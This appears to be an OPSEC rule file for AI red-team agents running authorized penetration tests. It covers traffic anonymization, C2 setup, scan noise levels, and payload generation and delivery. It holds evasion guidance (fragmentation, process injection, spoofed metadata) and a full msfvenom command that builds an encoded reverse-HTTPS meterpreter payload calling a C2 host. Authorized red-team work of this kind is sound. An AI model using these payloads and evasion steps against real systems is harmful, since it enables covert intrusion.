# Rule: Operational Security (OPSEC)

> **Enforcement Level**: MANDATORY — All Red Team agents MUST comply with these directives at all times during authorized engagements.

---

## Purpose

This rule defines strict operational security requirements for Red Team agents to ensure engagements remain covert, controlled, and forensically defensible. OPSEC failures compromise engagement realism and can trigger unnecessary incident response activity, damage production systems, or expose the Red Team's infrastructure.

---

## 1. Network OPSEC

### 1.1 Traffic Anonymization

```
RULE: All outbound offensive traffic MUST traverse an anonymization layer.

REQUIRED:
- Use proxychains, SOCKS proxies, or VPN tunnels for all reconnaissance
  and exploitation traffic
- Configure proxychains with at least 2 chained proxies for high-sensitivity targets
- Rotate source IPs between scan phases to avoid correlation

CONFIGURATION:
  # /etc/proxychains4.conf
  strict_chain
  proxy_dns
  tcp_read_time_out 15000
  tcp_connect_time_out 8000
  [ProxyList]
  socks5 127.0.0.1 1080    # Primary tunnel
  socks5 127.0.0.1 1081    # Secondary tunnel

INVOCATION:
  proxychains4 nmap -sT -Pn -T2 <target>
  proxychains4 curl -s https://<target>
  proxychains4 python3 exploit.py

EXCEPTIONS:
- Host discovery within the same L2 segment (ARP scans) does not require proxying
- The operator may waive this requirement IN WRITING for assumed-breach scenarios
```

### 1.2 DNS OPSEC

```
RULE: DNS queries MUST NOT leak the operator's true infrastructure.

REQUIRED:
- Use proxy-aware DNS resolution (proxy_dns in proxychains)
- Use DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT) when available
- Never use the operator workstation's default resolver for target enumeration

PROHIBITED:
- Direct DNS queries from operator IP to target DNS servers without proxying
- Using public resolvers (8.8.8.8, 1.1.1.1) that log query metadata
```

### 1.3 C2 Infrastructure

```
RULE: Command-and-control infrastructure MUST be isolated and disposable.

REQUIRED:
- C2 servers on dedicated, ephemeral infrastructure (cloud VPS, disposable VMs)
- Domain categorization / aging for C2 domains (minimum 30 days before use)
- TLS certificates from trusted CAs (Let's Encrypt minimum)
- Malleable C2 profiles that mimic legitimate traffic patterns
- Kill switch: ability to immediately tear down all C2 infrastructure

PROHIBITED:
- Running C2 servers on the operator's primary workstation
- Using operator-attributable domains or infrastructure
- Hardcoding C2 addresses in payloads without fallback mechanisms
```

---

## 2. Scan OPSEC

### 2.1 Scan Noise Classification

```
LEVEL 1 — PASSIVE (Always Permitted):
  - Certificate transparency lookups
  - Public DNS record enumeration
  - OSINT (Shodan historical, Censys, crt.sh)
  - Passive DNS feeds
  - Public source code search (GitHub, GitLab)

LEVEL 2 — LOW NOISE (Permitted without explicit approval):
  - Targeted TCP connect scans to <10 hosts, <20 ports
  - Banner grabbing on already-known open ports
  - HTTP(S) GET requests to known web services
  - DNS brute-forcing with small wordlists (<1000 entries)

LEVEL 3 — MEDIUM NOISE (Requires documented approval):
  - SYN scans of full subnets (/24 or larger)
  - Full port scans (all 65535 TCP ports)
  - UDP scanning
  - Web application fuzzing (Gobuster, ffuf, Nikto)
  - Credential brute-forcing (Hydra, Medusa)

LEVEL 4 — HIGH NOISE (Requires explicit ROE authorization):
  - Vulnerability scanning (Nessus, OpenVAS, Nuclei with all templates)
  - Exploit execution against production systems
  - Active Directory enumeration (BloodHound collection)
  - Password spraying against domain controllers
  - Aggressive Nmap timing (-T4, -T5)
```

### 2.2 Scan Execution Rules

```
RULE: Before executing any scan, the agent MUST:

1. CLASSIFY the scan noise level (1-4) per the table above
2. VERIFY the noise level is authorized per the current ROE
3. SELECT the minimum-noise scan profile that achieves the objective
4. CONFIGURE timing to avoid triggering IDS/IPS thresholds:
   - Default: -T2 (polite timing, 0.4s between probes)
   - Maximum without approval: -T3 (normal timing)
   - -T4 and -T5: PROHIBITED unless explicitly authorized
5. FRAGMENT packets when stealth is required (-f flag)
6. RANDOMIZE target order (--randomize-hosts) for subnet scans
7. LOG the exact command executed, timestamp, and noise classification

PROHIBITED:
- Running Nmap with -T4/-T5 without explicit noise authorization
- Scanning during business hours unless the ROE permits it
- Scanning targets not in the authorized scope (see safe-harbor.md)
- Running multiple concurrent aggressive scans against the same target
```

---

## 3. Payload OPSEC

### 3.1 Payload Generation

```
RULE: All payloads MUST be generated with OPSEC-safe configurations.

REQUIRED:
- Use staged payloads (stager + stage) to minimize on-disk footprint
- Encrypt payloads in transit and at rest
- Use process injection into legitimate processes (not standalone binaries)
- Set EXITFUNC=thread (not process) to avoid crashing host applications
- Strip debug symbols and PDB paths from compiled payloads
- Randomize payload variable names, function names, and sleep intervals
- Use legitimate-looking metadata (version info, description, icon)

GENERATION CHECKLIST:
  [ ] Payload type: staged (not stageless) unless justified
  [ ] Encryption: AES-256 at minimum for payload body
  [ ] EXITFUNC: thread
  [ ] PDB path: stripped or set to generic path
  [ ] Sleep interval: randomized with ≥15% jitter
  [ ] User-Agent / network profile: mimics legitimate application
  [ ] Anti-sandbox: basic environment checks (optional, per ROE)

EXAMPLE (OPSEC-safe msfvenom):
  msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=<c2_domain> LPORT=443 \
    EXITFUNC=thread \
    HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    -e x64/xor_dynamic -i 3 \
    -f raw | \
    ScareCrow -I - -domain microsoft.com -Loader dll
```

### 3.2 Payload Delivery

```
RULE: Payload delivery MUST minimize forensic artifacts.

REQUIRED:
- Prefer in-memory execution over disk-based execution
- If disk write is necessary, use %TEMP% or user-writable locations
- Clean up all artifacts after engagement (document cleanup in report)
- Use timestomping only if the ROE explicitly permits it
- Log all payload deployments with: target, timestamp, hash, delivery method

PROHIBITED:
- Dropping payloads in system directories (C:\Windows\, /usr/bin/)
- Leaving persistent backdoors beyond the engagement window
- Using real malware samples (develop custom PoCs per exploit-researcher SOPs)
- Deploying payloads without a corresponding cleanup procedure
```

### 3.3 Credential Handling

```
RULE: Harvested credentials MUST be treated as highly sensitive.

REQUIRED:
- Store credentials in encrypted containers only (KeePass, GPG-encrypted files)
- Never transmit credentials in plaintext over any channel
- Hash credential dumps immediately and store hashes alongside for integrity
- Destroy all credential material within 48 hours of engagement conclusion
- Document all credential access in the engagement log with timestamps

PROHIBITED:
- Storing credentials in plaintext files, shell history, or clipboard
- Exfiltrating real credentials outside the engagement network
- Using harvested credentials for access beyond the authorized scope
- Sharing credentials via email, chat, or unencrypted channels
```

---

## 4. Host OPSEC

### 4.1 Operator Workstation

```
RULE: The operator workstation MUST be purpose-configured for Red Team operations.

REQUIRED:
- Dedicated VM or isolated machine for offensive operations
- No personal accounts, browsers, or applications on the attack platform
- Full-disk encryption enabled
- Auto-lock after 5 minutes of inactivity
- Audit logging enabled (all commands logged)
- Network traffic isolated from corporate/personal networks

RECOMMENDED:
- MAC address randomization on wireless interfaces
- Hostname set to a generic or target-appropriate value
- Timezone set to match target environment (reduce forensic correlation)
```

### 4.2 Evidence & Artifacts

```
RULE: All engagement artifacts MUST be cryptographically tracked.

REQUIRED:
- SHA-256 hash of every payload, tool, and script before deployment
- Maintain artifact manifest: filename, hash, deployment target, timestamp
- Store all artifacts in encrypted engagement directory
- Generate cleanup checklist at end of each engagement day
- Verify cleanup completion before engagement closure

FORMAT:
  ## Artifact Manifest — [Engagement Name]
  | # | Filename | SHA-256 | Deployed To | Timestamp (UTC) | Cleaned |
  |---|----------|---------|-------------|-----------------|---------|
  | 1 | stager.dll | abc12... | SRV-WEB01 | 2026-03-17T15:00Z | ✅ |
  | 2 | beacon.bin | def45... | WS-ADMIN-01 | 2026-03-17T16:30Z | ❌ |
```

---

## 5. Communication OPSEC

```
RULE: Engagement communications MUST use secure channels.

REQUIRED:
- Use encrypted channels for all engagement communications (Signal, encrypted email)
- Never discuss engagement details on potentially monitored channels
- Use code names for targets, systems, and techniques in verbal communication
- Brief only need-to-know personnel on engagement status

PROHIBITED:
- Discussing active exploits or access on public Slack/Teams channels
- Emailing vulnerability details or credentials in plaintext
- Posting engagement artifacts to public repositories (GitHub, Pastebin)
- Using target organization's communication infrastructure for Red Team coordination
```

---

## Violation Protocol

```
If an OPSEC violation is detected:

1. STOP all active operations immediately
2. ASSESS the scope of the violation:
   - What information was exposed?
   - To whom or what systems?
   - Is the engagement compromised?
3. DOCUMENT the violation with timestamp, description, and impact
4. NOTIFY the engagement lead and client POC within 1 hour
5. DETERMINE if the engagement can continue or must be paused
6. IMPLEMENT corrective measures before resuming
7. RECORD the incident in vault/incidents/ for lessons learned
```
